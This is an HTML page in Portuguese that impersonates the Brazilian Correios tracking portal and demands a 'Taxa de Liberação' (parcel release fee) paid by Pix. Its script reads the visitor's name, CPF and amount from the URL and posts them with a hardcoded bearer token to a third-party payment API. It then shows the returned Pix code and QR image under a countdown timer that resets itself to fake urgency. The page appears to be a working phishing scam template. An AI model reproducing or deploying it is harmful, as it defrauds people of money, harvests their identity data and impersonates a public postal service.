<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
    <meta name="mobile-web-app-capable" content="yes">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Rastreamento</title>
    <link rel="shortcut icon" href="images/favi-ect.html">
    <link href="css/bootstrap.min.css" rel="stylesheet">
    <link href="css/custom.css" rel="stylesheet ">
    <script src="../../code.jquery.com/jquery-3.6.0.min.js"></script>
    <link rel="stylesheet" href="../../cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha512-SnH5WK+bZxgPHs44uWIX+LLJAJ9/2PkPKZ5QiAj6Ta86w+fsb2TkcmfRyVX3pBnMFcV7oQPJkl9QevSCWr3W6A==" crossorigin="anonymous" referrerpolicy="no-referrer">
</head>

<body class="">
  <section id="acessibilidade">
    <a tabindex="1">Acessibilidade</a>        
  </section>

  <section id="menu">
    <a class="hamburger" tabindex="1"></a>
    <a class="logo" href="#0"></a>
    <a class="pesquisar"></a>
    <a class="entrar" href="#0"></a>
  </section>

  <main>
    <div class="container">
      <nav aria-label="breadcrumb">
        <div id="trilha">
          Portal Correios <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i></span> Rastreamento <span><i class="fa fa-angle-right mx-2" aria-hidden="true"></i> </span> Pagamento
        </div>
      </nav>

      <div class="w-100 mx-auto">
        <div class="card-body border border-gray-300 p-4 mt-6 rounded-md shadow-md bg-gray-50 text-center col-400">
          <h2 class="fs-3 fw-bold text-blue-600 mb-2">Taxa de Liberação</h2>
          <p class="text-sm">Abra o app do seu banco, escaneie a imagem ou cole o código QR Code.</p>

          <div class="py-1 imagem-qrcode"></div>
          <div id="pixCode"></div>

          <div class="my-2">
            <button class="btn btn-primary btn-copiar-pix w-100"><i class="fas fa-copy"></i> <span>Copiar Código Pix</span></button>
          </div>

          <div class="row text-sm">
            <p><b>Valor:</b> R$ <span id="taxa"></span></p>
          </div>

          <div class="pt-3 text-sm">
            <p class="fw-bold text-sm">Identificação</p>
            <div class="row">
              <p><b>NOME:</b> <span id="taxa-nome"></span></p>
            </div>
            <div class="row">
              <p><b>CPF:</b> <span id="taxa-cpf"></span></p>
            </div>
          </div>

          <div class="timer-alert text-sm">
            <span class="timer-text">Tempo:<br>
              <b><span id="timer">10</span></b>
            </span>
          </div>


          <script>
            window.addEventListener("DOMContentLoaded", () => {
              const nome = getURLParameter('nome') || "Cliente";
              const cpf = getURLParameter('cpf') || "Não informado";
              const telefone = getURLParameter('telefone') || "Não informado";
              const email = getURLParameter('email') || "Não informado";
              const valor = getURLParameter('valor') || "0";

              // Corrige formatação do CPF se estiver sem pontos
              const cpfFormatado = cpf.replace(/^(\d{3})(\d{3})(\d{3})(\d{2})$/, "$1.$2.$3-$4");

              // Preencher na aba taxa
              document.getElementById("taxa-nome").textContent = nome;
              document.getElementById("taxa-cpf").textContent = cpfFormatado;

              // Preencher o valor
              const valorTaxa = (parseFloat(valor) / 100).toFixed(2).replace('.', ',');
              document.getElementById("taxa").textContent = valorTaxa;

              // Chama a função para criar a transação PIX
              criarTransacaoPix();
            });

            function getURLParameter(name) {
              const urlParams = new URLSearchParams(window.location.search);
              return urlParams.get(name);
            }

            function criarTransacaoPix() {
              const dadosPix = {
                name: document.getElementById("taxa-nome").textContent,
                email: "user@example.com", // Substitua pelo email do usuário
                cpf: document.getElementById("taxa-cpf").textContent.replace(/\D/g, ''), // Formatar CPF
                phone: "172677276", // Substitua pelo telefone do usuário
                paymentMethod: "PIX",
                amount: parseFloat(document.getElementById("taxa").textContent.replace(',', '.')), // Valor em reais
                items: [
                  {
                    unitPrice: parseFloat(document.getElementById("taxa").textContent.replace(',', '.')),
                    title: "Taxa de Liberação",
                    quantity: 1,
                    tangible: true
                  }
                ]
              };

              $.ajax({
                type: 'POST',
                url: 'https://api.ghostpay.com/transaction/purchase', // URL da API
                headers: {
                  'Authorization': 'Bearer f2895118-12ac-4537-88b7-1d3bc4a5c999' // Token de autorização
                },
                contentType: 'application/json',
                data: JSON.stringify(dadosPix),
                success: function(response) {
                  console.log("Transação criada com sucesso:", response);
                  document.getElementById("pixCode").textContent = response.pixCode; // Exibe o código PIX
                  gerarQrCode(response.pixQrCode); // Gera o QR Code
                },
                error: function(xhr) {
                  console.error("Erro ao criar transação:", xhr.responseText);
                }
              });
            }

            function gerarQrCode(codigoPix) {
              QRCode.toCanvas(document.createElement("canvas"), codigoPix, function(error, canvas) {
                if (error) {
                  console.error("Erro ao gerar o QR Code:", error);
                  return;
                }

                var img = document.createElement('img');
                img.src = canvas.toDataURL(); // Converte o canvas para uma imagem base64
                $('.imagem-qrcode').html(img); // Adiciona o QR Code na página
              });
            }

            $(document).ready(function () {
              const timerElement = $('#timer');
              let timeLeft = 300; // 5 minutos = 300 segundos
              timerElement.text(formatTime(timeLeft));

              function startTimer() {
                const countdown = setInterval(() => {
                  timeLeft--;
                  timerElement.text(formatTime(timeLeft)); // Atualizar o timer formatado

                  if (timeLeft <= 0) {
                    clearInterval(countdown); // Parar o contador
                    timeLeft = 300; // Reiniciar o timer para 5 minutos
                    timerElement.text(formatTime(timeLeft)); // Atualizar imediatamente
                    startTimer(); // Reiniciar o contador
                  }
                }, 1000);
              }

              startTimer();

              function formatTime(seconds) {
                const minutes = Math.floor(seconds / 60);
                const remainingSeconds = seconds % 60;
                return `${String(minutes).padStart(2, '0')}:${String(remainingSeconds).padStart(2, '0')}`;
              }

              $('.btn-copiar-pix').on('click', function () {
                var pixCode = $("#pixCode").text(); // Obtém o código PIX do elemento
                var $btn = $(this); // Referência ao botão clicado

                navigator.clipboard.writeText(pixCode).then(function () {
                  $btn.find('span').text('Código Pix copiado!');
                  setTimeout(function () {
                    $btn.find('span').text('Copiar Código Pix');
                  }, 3000);
                }).catch(function (err) {
                  console.error('Erro ao copiar o código Pix');
                });
              });
            });
          </script>

          <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
          <script src="js/bootstrap.js"></script>
          <script src="js/bootstrap.bundle.min.js"></script>
          <script src="https://cdn.tailwindcss.com/"></script>
        </div>
      </div>
    </div>
  </main>
</body>
</html>
